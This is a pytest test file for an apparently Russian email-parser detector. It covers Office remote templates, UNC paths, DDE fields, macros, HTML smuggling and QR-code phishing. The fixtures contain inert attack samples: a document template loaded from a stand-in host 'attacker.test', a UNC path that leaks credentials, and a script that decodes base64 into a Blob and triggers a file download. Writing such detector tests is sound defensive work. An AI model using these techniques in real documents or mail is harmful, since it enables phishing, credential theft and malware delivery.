"""Document references, QR codes and HTML smuggling (ТЗ 1.0.3 §38, §39, §40).

Each group tests the same two things: that the signal is found when it is really there, and
that it is *not* found in the ordinary content it most resembles. A detector without the second
half is a detector nobody will keep switched on.
"""

from __future__ import annotations

import io
import struct
import zipfile
import zlib

import pytest
from msp_mail_parser import (
    analyze_html_smuggling,
    extract_document_references,
    inspect_images,
    parse_message,
    read_image_header,
)

# ---------------------------------------------------------------------------------------------
# Fixtures built in-process: an inert file whose exact structure is known beats a sample file.
# ---------------------------------------------------------------------------------------------
_HYPERLINK = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"
_TEMPLATE = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
_IMAGE = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"


def _docx(relationships: list[tuple[str, str]], *, body: str = "<w:p/>", macro: bool = False) -> bytes:
    rels = "".join(
        f'<Relationship Id="r{index}" Type="{kind}" Target="{target}" TargetMode="External"/>'
        for index, (kind, target) in enumerate(relationships)
    )
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("[Content_Types].xml", "<Types/>")
        archive.writestr("word/document.xml", f"<w:document><w:body>{body}</w:body></w:document>")
        archive.writestr("word/settings.xml", "<w:settings/>")
        archive.writestr("word/_rels/settings.xml.rels", f"<Relationships>{rels}</Relationships>")
        if macro:
            archive.writestr("word/vbaProject.bin", bytes([0]) + b"inert")
    return buffer.getvalue()


def _png(width: int, height: int) -> bytes:
    def chunk(tag: bytes, payload: bytes) -> bytes:
        return struct.pack(">I", len(payload)) + tag + payload + struct.pack(">I", zlib.crc32(tag + payload))

    header = struct.pack(">IIBBBBB", width, height, 8, 0, 0, 0, 0)
    pixels = b"".join(b"\x00" + b"\xff" * width for _ in range(height))
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", header)
        + chunk(b"IDAT", zlib.compress(pixels))
        + chunk(b"IEND", b"")
    )


class TestOfficeDocuments:
    def test_remote_template_is_found(self) -> None:
        report = extract_document_references(_docx([(_TEMPLATE, "https://attacker.test/p.dotm")]))
        assert report.has_remote_template
        assert report.autoload_urls == ["https://attacker.test/p.dotm"]
        assert "OFFICE_REMOTE_TEMPLATE" in report.flags()

    def test_unc_reference_is_reported_separately_from_urls(self) -> None:
        """A UNC path is not a URL, and the consequence is different: the credential leaks."""
        report = extract_document_references(_docx([(_IMAGE, r"\\198.51.100.9\share\p.png")]))
        assert report.unc_references == [r"\\198.51.100.9\share\p.png"]
        assert report.urls == []
        assert "OFFICE_UNC_REFERENCE" in report.flags()

    def test_hyperlink_is_extracted_but_not_marked_autoload(self) -> None:
        """A link the reader must click is a weaker signal than one followed on open."""
        report = extract_document_references(_docx([(_HYPERLINK, "https://partner.test/doc")]))
        assert [u.normalized for u in report.urls] == ["https://partner.test/doc"]
        assert report.autoload_urls == []
        assert not report.has_remote_template

    def test_dde_field_in_the_body(self) -> None:
        report = extract_document_references(_docx([], body="<w:p>DDEAUTO</w:p>"))
        assert report.has_dde_field

    def test_the_word_dde_in_prose_is_not_a_field(self) -> None:
        body = "<w:p>Коллеги, обсудили DDE. Вопросов нет.</w:p>"
        assert not extract_document_references(_docx([], body=body)).has_dde_field

    def test_macro_part_is_detected(self) -> None:
        assert extract_document_references(_docx([], macro=True)).has_macro

    def test_a_document_without_references_is_clean(self) -> None:
        report = extract_document_references(_docx([]))
        assert report.urls == []
        assert report.flags() == []
        assert report.complete

    def test_non_ooxml_input_is_reported_not_guessed(self) -> None:
        report = extract_document_references(b"%PDF-1.7 not a zip")
        assert report.error == "NOT_OOXML"
        assert report.urls == []

    def test_a_zip_with_many_members_is_capped_and_says_so(self) -> None:
        """Reaching a cap must be visible: a part nobody read is not a part that was clean."""
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as archive:
            archive.writestr("[Content_Types].xml", "<Types/>")
            for index in range(500):
                archive.writestr(f"word/_rels/part{index}.xml.rels", "<Relationships/>")
        report = extract_document_references(buffer.getvalue())
        assert "MAX_PARTS" in report.truncated
        assert not report.complete
        assert "OFFICE_NOT_FULLY_PARSED" in report.flags()


class TestHtmlSmuggling:
    def test_full_assembly_is_recognised(self) -> None:
        html = (
            "<script>var d=atob('" + "QUJD" * 600 + "');"
            "var b=new Blob([d]);var a=document.createElement('a');"
            "a.href=URL.createObjectURL(b);a.download='x.zip';a.click();</script>"
        )
        report = analyze_html_smuggling(html)
        assert report.assembles_a_file
        assert "HTML_SMUGGLING_ASSEMBLY" in report.flags()

    def test_a_decoder_alone_is_not_enough(self) -> None:
        """Plenty of ordinary pages decode a short string; that is not smuggling."""
        report = analyze_html_smuggling("<script>var t = atob('aGVsbG8=');</script>")
        assert not report.assembles_a_file
        assert report.flags() == []

    def test_a_chunked_payload_is_still_a_payload(self) -> None:
        chunks = ",".join(f"'{'QUJDREVG' * 4}'" for _ in range(12))
        html = f"<script>var p=[{chunks}];var d=atob(p.join(''));var b=new Blob([d]);</script>"
        report = analyze_html_smuggling(html)
        assert report.chunked_payload
        assert report.assembles_a_file

    def test_ordinary_newsletter_is_clean(self) -> None:
        html = (
            "<html><body><h1>Новости</h1><p>Читайте обзор на "
            '<a href="https://news.partner.test/review">сайте</a>.</p>'
            '<img src="https://news.partner.test/logo.png"></body></html>'
        )
        report = analyze_html_smuggling(html)
        assert report.signal_count == 0
        assert report.flags() == []

    def test_oversized_page_is_truncated_and_says_so(self) -> None:
        report = analyze_html_smuggling("<p>a</p>" * 1_000_000)
        assert report.truncated
        assert "HTML_NOT_FULLY_SCANNED" in report.flags()


class TestImagesAndQr:
    @pytest.mark.parametrize(
        ("data", "fmt", "size"),
        [
            (_png(300, 300), "png", (300, 300)),
            (b"GIF89a" + struct.pack("<HH", 120, 120) + b"\x00" * 8, "gif", (120, 120)),
        ],
    )
    def test_header_dimensions(self, data: bytes, fmt: str, size: tuple[int, int]) -> None:
        info = read_image_header(data)
        assert (info.format, info.width, info.height) == (fmt, *size)

    def test_truncated_image_does_not_raise(self) -> None:
        assert read_image_header(b"\x89PNG\r\n\x1a\n").format == ""

    def test_square_image_with_a_scan_prompt_is_a_candidate(self) -> None:
        report = inspect_images([("code.png", _png(300, 300))], body_text="Отсканируйте QR-код для оплаты")
        assert report.candidate_images == ["code.png"]
        assert report.likely_quishing

    def test_without_a_prompt_a_small_square_image_is_just_a_logo(self) -> None:
        report = inspect_images([("logo.png", _png(32, 32))], body_text="Договор во вложении")
        assert report.candidate_images == []
        assert not report.likely_quishing

    def test_a_wide_banner_is_never_a_qr_candidate(self) -> None:
        report = inspect_images([("banner.png", _png(600, 90))], body_text="Отсканируйте код")
        assert report.candidate_images == []

    def test_missing_decoder_is_stated_not_hidden(self) -> None:
        """ТЗ §3: the platform must say it could not read the code, not that it found nothing."""
        report = inspect_images([("code.png", _png(300, 300))], body_text="Отсканируйте QR-код")
        if not report.decoder_available:
            assert report.urls == []
            assert report.likely_quishing, "признак должен остаться, когда код не прочитан"


class TestEndToEnd:
    def _message(self, *, attachment: tuple[str, bytes, str], text: str) -> bytes:
        import base64

        name, data, mime = attachment
        return (
            "From: Partner <billing@partner.test>\r\n"
            "To: buh@corp.example\r\n"
            "Subject: Test\r\n"
            "MIME-Version: 1.0\r\n"
            'Content-Type: multipart/mixed; boundary="b1"\r\n'
            "\r\n"
            "--b1\r\n"
            'Content-Type: text/plain; charset="utf-8"\r\n'
            "Content-Transfer-Encoding: base64\r\n\r\n"
            f"{base64.b64encode(text.encode()).decode()}\r\n"
            "--b1\r\n"
            f"Content-Type: {mime}\r\n"
            f'Content-Disposition: attachment; filename="{name}"\r\n'
            "Content-Transfer-Encoding: base64\r\n\r\n"
            f"{base64.b64encode(data).decode()}\r\n"
            "--b1--\r\n"
        ).encode()

    def test_office_links_reach_the_parsed_urls(self) -> None:
        raw = self._message(
            attachment=(
                "akt.docx",
                _docx([(_TEMPLATE, "https://attacker.test/p.dotm")]),
                "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            ),
            text="Акт во вложении",
        )
        parsed = parse_message(raw)
        assert "https://attacker.test/p.dotm" in [u.normalized for u in parsed.urls]
        assert any("OFFICE_REMOTE_TEMPLATE" in a.meta.flags for a in parsed.attachments)
        assert parsed.documents

    def test_unread_qr_marks_the_scan_incomplete(self) -> None:
        raw = self._message(
            attachment=("code.png", _png(300, 300), "image/png"),
            text="Отсканируйте QR-код, чтобы оплатить счёт",
        )
        parsed = parse_message(raw)
        assert parsed.qr["likely_quishing"] is True
        if not parsed.qr["decoder_available"]:
            assert "QR_NOT_DECODED" in parsed.limits_hit, "непрочитанный код обязан делать проверку неполной"
